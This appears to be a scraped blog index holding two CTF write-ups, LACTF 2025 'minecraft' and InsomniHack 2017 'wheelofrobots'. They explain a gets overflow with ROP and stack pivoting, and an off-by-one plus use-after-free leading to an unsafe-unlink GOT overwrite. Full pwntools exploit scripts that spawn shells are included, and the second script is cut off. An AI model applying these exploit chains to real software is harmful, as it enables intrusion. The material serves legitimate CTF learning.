2025","externalUrl":null,"permalink":"/posts/1750992676979-poc-report-of-ghostscript-cve-2025-27835/","section":"Posts","summary":"","title":"PoC Report of Ghostscript CVE-2025-27835","type":"posts"},{"content":"","date":"9 February 2025","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"This challenge comes from LACTF\u0026rsquo;s /pwn/minecraft challenge in 2025. There are many different solutions to this challenge including FSOP but I stuck with just ROP and stack pivoting.\nminecraft # Protections # Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No So I can overwrite the GOT, don\u0026rsquo;t have to worry about canaries, and there\u0026rsquo;s no PIE so I can use hardcoded values in the binary.\nProgram Code # This program is pretty simple. It asks the user whether they want to play singleplayer or multiplayer. If multiplayer is chosen, the program calls exit with a value of 1.\nint main(void) { setbuf(stdout, NULL); while (1) { puts(\u0026#34;\\nM I N C E R A F T\\n\u0026#34;); puts(\u0026#34;1. Singleplayer\u0026#34;); puts(\u0026#34;2. Multiplayer\u0026#34;); if (read_int() != 1) { puts(\u0026#34;who needs friends???\u0026#34;); exit(1); } If singleplayer is chosen then it continues and prompts the user for a name for the world which is set using a gets call.\nputs(\u0026#34;Creating new world\u0026#34;); puts(\u0026#34;Enter world name:\u0026#34;); char world_name[64]; scanf(\u0026#34; \u0026#34;); gets(world_name); Then it asks the user whether they want to play survival or creative. If creative is chosen, the exit is called again with a value of 1.\nputs(\u0026#34;Select game mode\u0026#34;); puts(\u0026#34;1. Survival\u0026#34;); puts(\u0026#34;2. Creative\u0026#34;); if (read_int() != 1) { puts(\u0026#34;only noobs play creative smh\u0026#34;); exit(1); } If survival is chosen, then it conitnues and asks you whether you wish to return to the main menu or exit. If exit is chosen then the program returns 1 and if you choose to go to the main menu then this process repeats since all the logic is in a while true loop.\nputs(\u0026#34;Creating new world\u0026#34;); sleep(1); puts(\u0026#34;25%\u0026#34;); sleep(1); puts(\u0026#34;50%\u0026#34;); sleep(1); puts(\u0026#34;75%\u0026#34;); sleep(1); puts(\u0026#34;100%\u0026#34;); puts(\u0026#34;\\nYOU DIED\\n\u0026#34;); puts(\u0026#34;you got blown up by a creeper :(\u0026#34;); puts(\u0026#34;1. Return to main menu\u0026#34;); puts(\u0026#34;2. Exit\u0026#34;); if (read_int() != 1) { return 0; } And the way the program receives input is through a custom read_int function that exits if scanf does not match exactly 1 character and returns the number matched.\nint read_int() { int x; if (scanf(\u0026#34; %d\u0026#34;, \u0026amp;x) != 1) { puts(\u0026#34;wtf\u0026#34;); exit(1); } return x; } Exploitation # In search of gadgets # There is no stack canary so I can blow through the buffer, overwrite the stack pointer to rbp, and overwrite the return address. The first thing I did was look for any useful ROPgadgets in the binary and for the most part they are not helpful. Since I can push whatever I want on the stack, pops would be useful but the only pop gadget is for rbp.\nWhat do I control? # The next thing is looking at what I control. Because of the gadget, I can control rbp to be any value I want. So I look through all instructions in main and read_int to see what I can do with a controlled rbp and I found two things:\nSo if I control rbp, I can set it to a specific value so that rdi will be set to an arbitrary location to get an arbitrary write to any writable location in memory.\nThere was also this in read_int where you can control the format string that scanf takes in. So if you write another format string like \u0026ldquo;%p\u0026rdquo; somewhere in memory and then give it to read_int here by jumping in the middle of the function you might be able to print the address of the integer buffer than read_int uses for a stack leak but this will definitely mess up the stack making it hard to return back to the middle of read_int.\nBut another thing I noticed was that every puts call used rax to store the string to be printed. So if I\u0026rsquo;m able to control rax, then I\u0026rsquo;m able to control what gets printed if I just jump to the instruction before puts.\nBut looking at the gadgets again, there are no useful ones for rax that let me set it directly except for one.\nBut this does not help since it would forceibly call the leave instruction which will move the stack to wherever I set rbp to and I do not know what rbp originally was before I overwrote it so this gadget does not help.\nI was stuck for a while here. and started looking at one_gadgets thinking thats what it could be but that doesnt work without a libc leak and without more control of other registers. I was stuck for a while and deicded to look at main and read_int for any instance of rax until I remembered that read_int returns the number I input which is always rax\nSo I can add the start of read_int to my ropchain and it will set rax for me. Sweet.\nNow that I control rax, I can control what I want to print with puts. The easiest thing is to just print the address of an already called function in the GOT to get the leak. So that\u0026rsquo;s what I decided to do.\nThe ropchain now lookes like this:\npayload = b\u0026#39;A\u0026#39; * 64 payload += p64(1) payload += nop_ret payload += read_ int payload += p64(0x401243) Fill the buffer with 64 A\u0026rsquo;s, overwrite the stack pointer to rbp to a garbage value, call read_int, and then jump to the instruction before a puts call so I set rdi based on rax and call puts. There is a nop ; ret gadget before the call to read_int because the scanf call fails due to the stack not being 16 byte aligned. This doesnt have to be a gadget, it could be any series of 8 bytes on the stack but I just put a nop gagdet. Since all puts calls in this binary all follow the same structure, any puts in the binary will do. The progarm will prompt me to input a number since I am calling read_int. Since I want to print an already called function, I will just set rax to 0x404040 (4210688) which is the address of puts in the GOT.\np.sendline(b\u0026#39;4210688\u0026#39;) After puts is called, the address of puts is printed and I subtract the offset of puts from the libc file given to me to get the base address of libc:\np.recvuntil(b\u0026#39;\\x80\u0026#39;) puts_got = int.from_bytes(b\u0026#39;\\x80\u0026#39; + p.recv(5), \u0026#39;little\u0026#39;) libc.address = puts_got - libc.sym[\u0026#39;puts\u0026#39;] print(\u0026#39;[+] libc base @ \u0026#39;, hex(libc.address)) [+] libc base @ 0x7f6f74787000\nNow that I know where libc is. I know where every instruction in libc is. This means that I know where each ropgadget is. I now have access to every ropgadget I would ever need so now all I need is a way to call a second ropchain and I win.\nThe second ropchain and pivoting the stack # Now I need to be able to call again to be able to write my second ropchain somewhere. But how do I call gets? If I get main to call ret after I print the leak, the program will call the leave instruction and will mess up the ret since it will move the stack (rsp) to rbp and attempt to execute from there? Remeber how I said I can jump to any puts call in my ropchain since they all do the same instruction right before puts is called? This is not entirely true because if I jump to a puts call after the gets call, then I run into that problem with leave. But if I jump to a puts call before the gets call, then I get to call puts for the leak and call gets with my custom rbp like in the first gets call to set the ropchain. This means I need to set rbp to where I want to write my ropchain which means I need to go back and modify my original ropchain.\nThe first ropchain is now:\npayload = b\u0026#39;A\u0026#39; * 64 payload += p64(1) payload += nop_ret payload += read_int payload += pop_rbp_ret payload += data_section payload += p64(0x401243) In order:\nFill the 64 byte buffer set stack pointer of rbp to garbage value nop ; ret gadget to 16 byte align the stack for scanf in read_int pop rbp ; ret gadget to set the rbp to the next thing on the stack push an address from the .data section on the stack so rbp gets set to it, in this case its 0x404138 the address of the mov rdi, rax instruction of the puts call before the gets call Now that I have set rbp to a writable place in memory, after the puts call I will be able to write my ropchain at rbp-0x40 which is 0x404138 - 0x40 = 0x4040f8. Now I can start writing my second ropchain here and the best part about it is that when main finishes and calls leave, it will move the stack (rsp) to 0x404138.\nSince the stack will move to 0x404138, I just pad my second ropchain with a bunch of \u0026lsquo;A\u0026rsquo;s until I get to 0x404138. The gets will start writing at 0x4040f8 so I pad it with 0x404138 - 0x4040f8 = 0x40 \u0026lsquo;A\u0026rsquo;s. From here is where I start writing the second ropchain. Since I have all the gadgets I would ever need I could have just made a ropchain to call system(\u0026quot;/bin/sh\u0026quot;) but I decided to use one of the one_gadgets I found earlier:\nSince rbp is already in the .data section, rbp-0x38 is already writable. I just need to set rdi and r13 to 0 so I find the pop gadgets for each of the two registers in the provided libc and add them to my second ropchain and push 0 so that they each get set to 0. Finally, I put the address of the one gadget to pop the shell.\nSo the second ropchain is:\npayload2 = b\u0026#39;A\u0026#39; * 0x40 payload2 += pop_rdi payload2 += p64(0x0) payload2 += pop_r13 payload2 += p64(0x0) payload2 += one_gadget There\u0026rsquo;s still a problem though. Once I set this second ropchain in gets and I attempt to move the stack pointer to rbp with leave, it will not mess up and move rsp to 0x404140 instead of 0x404138 like where rbp actually is. This is because the leave instruction actually does two things:\nmov rbp, rsp ; restores the stack frame pop rbp ; sets rbp to old rbp of the caller stack frame to continue execution The leave instruction moves the stack pointer to the base pointer meaning rsp gets set to 0x404138 like I want. But the pop rbp will pop whatever rsp points to into rbp. In my case, this is the pop rdi ; ret gadget. So leave will pop that address into rbp and start executing my ropchain from the 0x00000000 address right after it. This is actually an easy fix. Just put an address after the 0x40 \u0026lsquo;A\u0026rsquo;s to set rbp. This needs to be a writable section because the one_gadget requires that rbp-0x38 is wirtable so I just set it to 0x404200.\npayload2 = b\u0026#39;A\u0026#39; * 0x40 payload2 += p64(0x404200) payload2 += pop_rdi payload2 += p64(0x0) payload2 += pop_r13 payload2 += p64(0x0) payload2 += one_gadget Now this pops a shell and I can just get the flag.\nI really enjoyed this challenge mostly because I like thinking of different ways to pivot the stack and it made me think outside the box. I\u0026rsquo;m also not too familiar with FSOP so I\u0026rsquo;m not too sure how others did this challenge with FSOP but I would think that it is more complicated than this solution.\nFull Exploit Code # # cp ./chall ./chall_patched # patchelf ./chall_patched --set-interpreter ./path/to/ld/file from pwn import * context.clear(arch=\u0026#39;amd64\u0026#39;, terminal=[\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-fh\u0026#39;], aslr=True) elf = ELF(\u0026#39;./chall_patched\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) # minecraft gadgets nop_ret = p64(0x4010ef) pop_rbp_ret = p64(0x40115d) main = p64(elf.sym[\u0026#39;main\u0026#39;]) read_int = p64(elf.sym[\u0026#39;read_int\u0026#39;]) data_section = p64(0x404100 + 0x38) # add 0x38 bc we will overwrite rbp later wil a writable section for one gadget p = process(\u0026#39;./chall_patched\u0026#39;, env={\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc.so.6\u0026#34;}) #p = remote(\u0026#39;chall.lac.tf\u0026#39;, 31137) payload = b\u0026#39;A\u0026#39; * 64 # fill buffer payload += p64(1) # sets stack pointer to rbp to a garbage value # 1st ropchain payload += nop_ret # nop ; ret to 16 byte align stack payload += read_int # sets rax to our input (0x404010 for puts got addr) for overwrite payload += pop_rbp_ret # pop rbp ; ret payload += data_section # push a data_section on the stack so pop rbp gadget sets rbp = exit@got to be able to write second ropchain there payload += p64(0x401243) # ret to puts before the gets call to print a libc leak, setup second ropchain with gets, and execute the new ropchain p.sendline(b\u0026#39;1\u0026#39;) # singleplayer p.sendline(payload) # this is the 1st gets call, sets ropchain p.sendline(b\u0026#39;1\u0026#39;) # survival p.sendline(b\u0026#39;2\u0026#39;) # exit = 2, restart = 1 p.clean() p.sendline(b\u0026#39;4210688\u0026#39;) # setting rax to puts@got from read_int in ropchain to puts libc leak p.recvuntil(b\u0026#39;\\x80\u0026#39;) puts_got = int.from_bytes(b\u0026#39;\\x80\u0026#39; + p.recv(5), \u0026#39;little\u0026#39;) libc.address = puts_got - libc.sym[\u0026#39;puts\u0026#39;] print(\u0026#39;[+] libc base @ \u0026#39;, hex(libc.address)) # libc ropgadgets pop_rdi = p64(libc.address + 0x277e5) pop_r13 = p64(libc.address + 0x29830) one_gadget = p64(libc.address + 0xd511f) # 2nd ropchain payload2 = b\u0026#39;A\u0026#39; * 0x40 # 0x4040f8 - 0x404130 are set to \u0026#39;A\u0026#39;s, started writing at 0x4040f8 bc the gets call writes to rbp-0x40. rbp is 0x404038 so minus 0x40 = 0x4040f8 payload2 += p64(0x404200) # 0x404138 sets rbp to 0x404200 needed for one_gadget since rbp-0x38 needs to be a writable section payload2 += pop_rdi payload2 += p64(0x0) # set rdi = NULL payload2 += pop_r13 payload2 += p64(0x0) # set r13 = NULL payload2 += one_gadget # pop shell p.sendline(payload2) # send second ropchain p.sendline(b\u0026#39;1\u0026#39;) # survivial to get to main epilogue p.sendline(b\u0026#39;2\u0026#39;) # get to main epilogue to call leave to pivot stack to data_section 0x404140 sleep(5) # get rid of the program output for cleaner output p.clean() print(\u0026#39;[+] Popped shell\u0026#39;) p.interactive() ","date":"9 February 2025","externalUrl":null,"permalink":"/posts/1750900346215-test-article/","section":"Posts","summary":"","title":"LACTF 2025 minecraft Writeup","type":"posts"},{"content":"","date":"9 February 2025","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"Wheelofrobots is a pwn challenge in InsomniHack’s 2017 CTF. This challenge involved adding, removing, and changing names of 6 different robots and spinning a wheel in which the program then exits.\nwheelofrobots # Protections # Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Program Code # Upon running the program, we get this:\nSo we can add robots, delete robots, change robot names, and start the wheel of robots.\nadd robot function # Looking at the function that adds robots, it takes input using read into a char[4] global variable buffer that is zeroed out before reading input.\nSo we can choose from the six robots which one to add. The program just reads our input and if its a number from 1-6 and we havent exceeded 3 added robots, it will add the robot by turning on the global flag for that robot, set the malloc pointer to the robot’s global malloc pointer, and increment the number of robots by 1. It will also set the data of the chunk to the name of the robot which we will be able to change later.\nif (total_robots \u0026lt; 3) { switch (input_num) { case 1: if (tinny_tim_added = 0) { calloc_ptr = (undefined8 *) calloc(1,0×14); tinny_tim_added = 1; tim_calloc_ptr = calloc_ptr; /* Tonny Tom */ *calloc_ptr = 0x69542079666954; *(undefined2 *) (calloc_ptr + 1) = 109; total_robots += 1; } break; Some robots have special attributes, allowing us to choose how much we want to malloc for a robot with an attribute:\nBender has intelligence that we can choose to be a value from 1-4 otherwise its 2 Robot Devil has cruelty that we can choose to be a value from 1-99 otherwise its 20 Destructor has powerful that we can choose to be any value \u0026gt; 0 These values will be multiplied by 0x14 as the value to calloc. So the chunk sizes that each robot calloc can be are:\nTinny Tim: 0x20 Bender: 0x20 - 0x60 Robot Devil: 0x20 - 0x7d0 Chainsmoker: 0xfa0 Billionaire Bot: 0x9c40 Destructor: Any size A Vulnerability # But in the function that adds robots only, it reads in input for 5 characters into a buffer that is 4 characters long, so we get a 1 byte overflow into the global variable that is below it in memory. Many global variables are in this program including which are these in this order:\nThe calloc pointer for each robot The input buffer Flags for each robot that indicates the robot has been added Total robots added variable The special attributes for each robot Conveniently, the global variable immediately after the input buffer is the flag for bender, so we can artificially set whether bender has been added or not which will be very important for later\nremove robot function # This function is relatively simple as it just takes input and if it is a number from 1-6 it will attempt to remove the robot by decrementing the total robot global variable, freeing the calloc pointer, and turning off the flag indicating that the robot is no longer added. But we can’t just remove any robot whenever since the program actually checks each robot’s flag to check if they are added. If the robot is not currently added, then nothing will happen and the robot will not be removed and if the robot is added it will remove it. And since we can change bender’s flag artificially, we can remove him whenever.\nundefined4 input_num; print_robot_names (\u0026#34;Which robot do you want to remove from the wheel?\u0026#34;); printf(\u0026#34;Your choice :\u0026#34;); memset (input,0,4); input_num = read_input(input,4) ; switch(input_num) { case 1: if (tinny_tim_added != 0) { free(tim_calloc_ptr); tinny_tim_added = 0; total_robots += -1; } break; case 2: if (bender_added != 0) { free(bender_calloc_ptr); bender_added = 0; total_robots += -1; } break; Another Vulnerability # The calloc pointer for each robot is freed but never NULLed out which I did not catch on the first time reading this function. So the global pointers will still have references to the places in the heap where the calloc pointer once was, which is also another important part of solving this challenge.\nchange robot name function # Another relatively simple function. All it does is take input and if the value is between 1-6 we will be able to change the data at the calloc pointer for each corresponding robot. The amount we can write into the chunk is determined by the special attribute of the robot if it has one, otherwise its the static value so we cannot write more than we allocated\nundefined4 robot_name_input; print_robot_names(\u0026#34;Which robot\\\u0026#39;s name do you want to change?\u0026#34;); printf(\u0026#34;Your choice :\u0026#34;); memset(input,0,4) ; robot_name_input = read_input(input,4); switch(robot_name_input) { case 1: if (tinny_tim_added != 0) { puts(\u0026#34;Robot\\\u0026#39;s name: \u0026#34;); read(0,tim_calloc_ptr,0x14); } break; case 2: if (bender_added != 0) { puts(\u0026#34;Robot\\\u0026#39;s name: \u0026#34;); read(0,bender_calloc_ptr, bender_intelligence * 0x14); } break; There is no vulnerability here.\nstart the wheel function # First this function checks whether total_robots \u0026lt; 3 and returns if it isnt. Then the function will generate a random value between 1-6 using urandom. It then enters a switch statement.\nIf the random value is 1 it checks if bender is added and if not, it prints out the string at tim’s calloc pointer which will just be tinny tim if the name was not changed.\nIf the value is 2, it does nothing\nIf the value is 3-6 it will goto a specific part of a nested chain of if statements.\nThe default action is to print ascii art of a demon and exits.\nrand_val = random_modulus (6); switch (rand_val) { default: goto switchD_00401674_caseD_0; case 1: if (bender_added != 0) { print_fry(tim_calloc_ptr); goto LAB_00401720; } break; case 2: break; case 3: goto switchD_00401674_caseD_3; case 4: goto switchD_00401674_caseD_4; case 5: goto switchD_00401674_caseD_5; case 6: goto switchD_00401674_caseD_6; ｝ if (bender_added == 0) { switchD_00401674_caseD_3: if (devil_added == 0) { switchD_00401674_caseD_4: if (chainsmoker_added == 0) { switchD_00401674_caseD_5: if (billionaire_bot_added == 0) { switchD_00401674_caseD_6: if (destructor_added == 0) { switchD_00401674_caseD_0: print_demon(\u0026#34; AH AH AH Welcome in Robot Hell!! \u0026#34;); } The nested if statements just go through the list of the 6 robots until it finds one where the flag is turned on. Once it finds one where it\u0026rsquo;s on, it prints ascii art of Fry from Futurama with the string at the calloc pointer for the specific bot.\nSo if the random number was 4, the program would then check if chainsmoker is added and if it is then it prints its chunk data, if not it checks billionaire bot, if not it checks destructor and if none are added it will print the demon. So it simulates spinning a wheel. The only exception to this is the first line where it checks if bender is added as the first if statement in the nested conditionals. If the program sees that bender is added, it will actually print ascii art of Bender from Furutrama and no data is printed which only happens if the random value is 2 and bender is added.\nAfter spinning the wheel, the program terminates.\nExploitation # So we have a 1 byte buffer overflow allowing us to artificially turn on benders flag when we add a robot and the calloc pointers of robots are not NULLed out allowing for a use after free which are saved as global pointers.\nThis sounds like an unsafe unlink attack. Most of the requirements are met.\nThis attack works best on heap pointers that are global variables since we will be able to begin writing data at the address of that pointer. Pointers are not NULL/ zeroed out Chunks need to be adjacent to the top chunk to consolidate Need to be able to change the metadata of another chunk The only one we are missing is being able to overwrite the metadata of another chunk which will be difficult since the program does a good job of only being able to write how much we allocated, but the UAF will help get around this.\nGetting a Heap Overflow # Since the pointers are not NULLed out, we can calloc a chunk so that upon another calloc, that new chunk address will be immediately after it in memory. Then free the two chunks and calloc a slightly larger chunk than the first so that the pointer of the second calloc that was made will point near the end of the new slightly larger chunk, allowing us to overwrite the metadata of the next chunk we allocate since the program will believe that where we would be writing to would be the start of a chunk when it\u0026rsquo;s actually near the end.\nIt\u0026rsquo;s important to note that the first chunk must be greater than the tcache max size or else it won\u0026rsquo;t consolidate which means the first chunk in the unlink attack must be greater than 0x410.\nSo first we calloc the destructor bot with a size greater than 0x410. I set destructor’s powerful value to 53 because 53 * 0x14 = 0x424\nadd_bot('6', '53')\nThen I add the bender bot with the max intelligence value of 4 (0x60 size) since I want to make sure I’ll be able to reach the metadata when overwriting it. This also initializes the bender pointer to this spot in memory.\nadd_bot('2', '4')\nThen I remove destructor which puts the chunk in the unsorted bin and then remove bender to put it into the fastbin. The order of freeing doesn’t matter since freeing a fastbin on its own next to the top chunk will not consolidate it.\nremove_bot('6')\nremove_bot('2')\nNow I need a way to remove these two chunks from the heap, so I add the chainsmoker bot which has a fixed size of 0xfa0 which is greater than the two chunks calloced earlier, causing the heap allocator to merge these two chunks together and add the remaining from the top chunk as one entire chunk. So this is combining two smaller chunks into one bigger one. I\u0026rsquo;m also setting the bender flag on here since the bender bot is now freed but I want to still be able to write at its address. This “consolidation” stage occurs whenever a malloc request is made that is larger than a fastbin can service (i.e., for chunks over 512 bytes or 1024 bytes on 64-bit) add_bot('4\\x00\\x00\\x00\\x01')\nNow since the chainsmoker bot is next to the top chunk and its size is greater than tcache max size, the heap allocator will consolidate it when we free it and merge it back with the top chunk. So now we’ve cleared out all the chunks in the heap.\nremove_bot('4')\nNow I calloc devil bot at a slightly larger size than the destructor bot from before so that the bender pointer will be pointing at the end of this chunk.\nadd_bot('3', '55')\nThen I add destructor bot again with the same size as devil, this is the chunk who’s metadata will be overwritten. It is important that this chunk is greater than the tcache max size otherwise the heap allocator will not unlink the chunks.\nadd_bot('6', '55')\nNow we have a pointer near the end of a chunk which will allow us to overwrite the metadata of another chunk. And since I flipped the flag for bender, the program thinks that bender is added and will allow me to write data at that location. So now we need to craft the fake chunk for the unsafe unlink.\nunsafe unlink attack # The two chunks currently in the heap are at sizes 0x460, so I will craft my fake chunk to be 0x450 since I want the heap allocator to consolidate backwards and unlink my fake chunk. So I create fake_chunk_metadata and fill it with the necessary metadata and write it to devil bot’s chunk. I chose the address of devil bots address 0x00603100 but any of the global variables could work. It would actually be better to use 0x006030f8 since you would be able to overwrite chainsmoker’s pointer making the chances at the wheel spin better.\nfake_chunk_metadata = p64(0x00000000)\t# filler fake_chunk_metadata += p64(0x00000451)\t# fake_chunk size fake_chunk_metadata += p64(0x00603100 - 0x18)\t# P-\u0026gt;fd-\u0026gt;bk = P fake_chunk_metadata += p64(0x00603100 - 0x10)\t# P-\u0026gt;bk-\u0026gt;fd = P change_name(\u0026#39;3\u0026#39;, fake_chunk_metadata) 0x00603100 is the address of devil bot’s global calloc pointer. The fd needs to be the global pointer - 0x18 and the bk needs to be the global pointer = 0x10 so that we pass the security check in glibc that would prevent this from working with other memory addresses. The prev_in_use flag for the fake chunk size does not need to be set in order for the attack to work.\nThen I craft the footer of the fake chunk which I will write to bender. The prev size needs to be set as the size of the fake chunk. Then the prev_in_use flag of the next chunk needs to be turned off for the unlink to work since it will see that this chunk says that the chunk before it (our fake chunk is free) and will unlink both this and the fake chunk.\nfake_chunk_footer = p64(0x00000000) * 4 fake_chunk_footer += p64(0x00000450)\t# prev_size fake_chunk_footer += p64(0x00000460)\t# prev_in_use flag off change_name(\u0026#39;2\u0026#39;, fake_chunk_footer) The fake chunk now looks like this in the heap. The blue is the devil bot and the yellow is the destructor bot.\nThe last step to do is remove the destructor bot to cause the heap allocator to unlink the chunks:\nremove_bot('6')\nAnd now when I check the address of devil bot’s calloc pointer in memory, it says that its at the address 0x006030e8 which is the same as 0x00603100 - 0x18 which is the same as the address of destructors global calloc pointer. So the next time we write to the devil bot, we will be overwriting the global variables.\nPopping a shell # Since there is partial RELRO, the first thing I thought of was overwriting a GOT address to system and call that function with a pointer to “/bin/sh” to pop a shell. This requires a libc leak to know where the functions in libc are because of ASLR.\nThe function that spins the wheel has a chance of printing the data at a calloc pointer, so if I make one or more of the global calloc pointers point to a GOT address, I will get a libc leak. Since the total number of bots added is less than 3, more need to be added before I can spin the wheel. Then I write to devil bot which will overwrite the destructor, bender, tim, devil, and billionaire bot calloc pointers to be 0x603018, 0x6030f0, 0x603098, 0x603018, and 0x603018 respectively.\nadd_bot(\u0026#39;4\u0026#39;) add_bot(\u0026#39;1\u0026#39;) h​​eap_leak_payload = p64(0x603018) + p64(0x6030f0) + p64(0x603098) + p64(0x603018) * 2 change_name(\u0026#39;3\u0026#39;, heap_leak_payload) The address of free is at 0x603018 so I need to wheel to print any one of those 3 bots to get the leak.\nThe address of exit is at 0x603098 so I set tims pointer to the GOT address of exit so I can overwrite it with the address of the change_name function (0x4013e0) so that the function doesn’t terminate once it prints the leak.\nThe address of benders global pointer is 0x6030f0 so I have benders pointer point to itself for a later part in the exploit.\nchange_name('1', p64(0x4013e0))\nThere is a problem I ran into though. No matter what, the address of free was never printed in a reasonable amount of time (since the wheel is random). The reason is because the address of free starts with a NULL byte so printf stops there and doesnt print the rest. So I need to change the LSB of the free address to something other than a NULL byte so that it gets printed. So I change the name of devil bot which points to free and write 0x01.\nchange_name('3', b'\\x01')\nAnd now I just need to keep running the program until I get lucky and it prints the address of free.\nAfter this, the program will then call the change_name function since I overwrote the exit function in the GOT. So then I choose to change the name of destructor bot which points to free in the GOT and overwrite it with the address of system.\nFrom here all that\u0026rsquo;s left is to do is choose who I want to free so I chose bender. I had set benders calloc pointer to point to itself earlier for this reason, so I can edit it now. So I change bender\u0026rsquo;s pointer to be the address of the string “/bin/sh” in libc and then remove bender which calls free with the pointer of the string “/bin/sh” and a shell is popped.\np.send(b\u0026#39;3\u0026#39;) p.send(p64(system)) change_name(\u0026#39;2\u0026#39;, p64(next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;)))) remove_bot(\u0026#39;2\u0026#39;) Since the wheel is random, I wrapped this logic in a while loop and kept running the program until I got the leak and popped a shell.\nFull Exploit Code # from pwn import * def add_bot(index, optional=None): p.send(b\u0026#39;1\u0026#39;) print(p.recvuntil(b\u0026#39;choice :\u0026#39;).decode(), 1) p.send(index.encode()) print(p.recvuntil(b\u0026#39;choice :\u0026#39;).decode(), index) if (index.startswith(\u0026#39;2\u0026#39;) or index.startswith(\u0026#39;3\u0026#39;) or index.startswith(\u0026#39;6\u0026#39;)): p.send(optional.encode()) print(p.recvuntil(b\u0026#39;: \u0026#39;).decode(), optional) def remove_bot(index): p.send(b\u0026#39;2\u0026#39;) print(p.recvuntil(b\u0026#39;choice :\u0026#39;).decode(), 2) p.send(index.encode()) print(p.recvuntil(b\u0026#39;choice :\u0026#39;).decode(), index) def change_name(index, name): print(p.recvuntil(b\u0026#39;choice :\u0026#39;).decode(), 3) p.send(b\u0026#39;3\u0026#39;) print(p.recvuntil(b\u0026#39;choice :\u0026#39;).decode(), index) p.send(index.encode()) print(p.recvuntil(b\u0026#39;name:\u0026#39;).decode(), name) if (type(name) is str): p.send(name.encode()) elif (type(name) is bytes): p.send(name) def fill_tcache(size): add_bot(\u0026#39;2\u0026#39;, size) remove_bot(\u0026#39;2\u0026#39;) add_bot(\u0026#39;2\u0026#39;, size) remove_bot(\u0026#39;2\u0026#39;) add_bot(\u0026#39;2\u0026#39;, size) remove_bot(\u0026#39;2\u0026#39;) add_bot(\u0026#39;2\u0026#39;, size) remove_bot(\u0026#39;2\u0026#39;) add_bot(\u0026#39;2\u0026#39;, size) remove_bot(\u0026#39;2\u0026#39;) add_bot(\u0026#39;2\u0026#39;, size) remove_bot(\u0026#39;2\u0026#39;) add_bot(\u0026#39;2\u0026#39;, size) remove_bot(\u0026#39;2\u0026#39;) context.clear(arch=\u0026#39;amd64\u0026#39;, terminal=[\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-fh\u0026#39;]) main = 0x4017f2 before_input = 0x40185a exit_in_wheel = 0x401725 gdbscript = f\u0026#39;\u0026#39;\u0026#39;b *{main} b *{before_input} b *{exit_in_wheel} \u0026#39;\u0026#39;\u0026#39; gdbscript += \u0026#39;c\\n\u0026#39; * 17 elf = context.binary = ELF(\u0026#39;./wheelofrobots\u0026#39;) libc = elf.libc elf.address = 0x400000 while (True): if args.GDB: p = gdb.debug(\u0026#39;./wheelofrobots\u0026#39;, gdbscript=gdbscript) else: p = process(\u0026#39;./wheelofrobots\u0026#39;) fill_tcache(\u0026#39;4\u0026#39;) fake_chunk_metadata = p64(0x00000000)\t# filler fake_chunk_metadata += p64(0x00000451)\t# fake_chunk size fake_chunk_metadata += p64(0x00603100 - 0x18)\t# P-\u0026gt;fd-\u0026gt;bk = P fake_chunk_metadata += p64(0x00603100 - 0x10)\t# P-\u0026gt;bk-\u0026gt;fd = P fake_chunk_footer = p64(0x00000000) * 4 fake_chunk_footer += p64(0x00000450)\t# prev_size fake_chunk_footer += p64(0x00000460)\t# prev_in_use flag off heap_leak_payload = p64(0x603018) + p64(0x6030f0) + p64(0x603098) + p64(0x603018) * 2\t# set tim malloc ptr to exit GOT addr and the other bot ptrs to puts GOT addr #\t^ destructor\t^ bender\t^ tim\t^ devil - billionaire add_bot(\u0026#39;6\u0026#39;, \u0026#39;53\u0026#39;)\t# malloc \u0026gt; fastbin size to move the pointer for bender ptr deeper in heap to overwrite chunk metadata add_bot(\u0026#39;2\u0026#39;, \u0026#39;4\u0026#39;)\t# add bender bot for 0x60 chunk remove_bot(\u0026#39;6\u0026#39;)\t# remove destructor chunk, gets put into unsorted bin remove_bot(\u0026#39;2\u0026#39;)\t# remove bender chunk, gets put in fastbin add_bot(\u0026#39;4\\x00\\x00\\x00\\x01\u0026#39;)\t# add chainsmoker bot to consolidate fastbin chunk and unsorted bin chunk into one bigger allocated chunk remove_bot(\u0026#39;4\u0026#39;)\t# remove this new 0xfa0 size chunk, consolidates because \u0026gt; its next to top chunk and size \u0026gt; tcache max size add_bot(\u0026#39;3\u0026#39;, \u0026#39;55\u0026#39;)\t# malloc more than the first malloc call so that bender ptr is near end of chunk to overwrite next chunk metadata add_bot(\u0026#39;6\u0026#39;, \u0026#39;55\u0026#39;)\t# add another chunke \u0026gt; tcache max size, metadata will be overwritten change_name(\u0026#39;2\u0026#39;, fake_chunk_footer)\t# set prev_size and prev_in_use flag to off change_name(\u0026#39;3\u0026#39;, fake_chunk_metadata)\t# set fake chunk metadata, will get new chunk at global pointer remove_bot(\u0026#39;6\u0026#39;)\t# cause unsafe unlink add_bot(\u0026#39;4\u0026#39;)\t# so we can spin wheel add_bot(\u0026#39;1\u0026#39;)\t# add tim, which sets tims malloc ptr change_name(\u0026#39;3\u0026#39;, heap_leak_payload)\t# use new chunk at destructor ptr - 0x18 to overwrite tim ptr to start of GOT change_name(\u0026#39;1\u0026#39;, p64(0x4013e0))\t# set free to dummy value to overwrite again later and set _exit to instruction in main to restart main change_name(\u0026#39;3\u0026#39;, b\u0026#39;\\x01\u0026#39;)\t# change LSB null byte of GOT free addr so that program prints entire addr print(p.recvuntil(b\u0026#39;choice :\u0026#39;).decode()) p.send(b\u0026#39;4\u0026#39;)\t# spin wheel to try and print value of free address free_addr = int.from_bytes(p.recvuntil(b\u0026#39;!\\n\u0026#39;, timeout=1)[-8:-2], byteorder=\u0026#39;little\u0026#39;) - 1 if ((free_addr - libc.sym[\u0026#39;free\u0026#39;]) \u0026amp; 0xfffff != 0x00000): print(\u0026#39;[+] Garbage libc base address\u0026#39;) p.close() continue libc.address = free_addr - libc.sym[\u0026#39;free\u0026#39;] system = libc.sym[\u0026#39;system\u0026#39;] print(\u0026#39;libc base addr @\u0026#39;, hex(libc.address)) print(\u0026#39;system addr @\u0026#39;, hex(system)) 